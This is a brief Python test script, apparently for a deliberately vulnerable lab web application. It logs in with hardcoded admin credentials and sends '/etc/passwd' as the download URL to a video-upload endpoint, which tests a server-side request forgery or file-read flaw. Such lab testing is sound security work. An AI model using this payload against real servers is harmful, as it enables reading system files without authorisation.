# Basic unit test for the Hello World webpage

from bs4 import BeautifulSoup
import requests
import time

s = requests.Session()

"""
Log into the application
"""
def login(username, password):
    url = "http://localhost/loginvalidate.php"
    validCreds = {'username': username, 'password': password}
    result = s.post(url, validCreds, allow_redirects=True)

    return result

"""
Test video upload via file
"""
def test_ssrf():
    login('admin@rit.edu','password')
    url = 'http://localhost/proc/uploader.php'
    params = {'downloadurl':'/etc/passwd', 'vidtitle' : 'catz'}
    result = s.post(url, params=params)
    f=open('/var/html/videos/1/Array','r')
    assert(f)



"""
Utility function to delay test execution until docker-compose has brought all container online.
"""
def wait_for_docker_compose():
    failures = 0
    while failures < 10:
        try:
            home = requests.get("http://localhost", allow_redirects=True)
            break
        except:
            failures += 1
            time.sleep(30)

"""
Test whether the web server is online
"""
def test_connection():
    home = s.get("http://127.0.0.1:80", allow_redirects=True)
    assert (home != None)

"""
Execute test sequence
"""
wait_for_docker_compose()
test_connection()
test_ssrf()

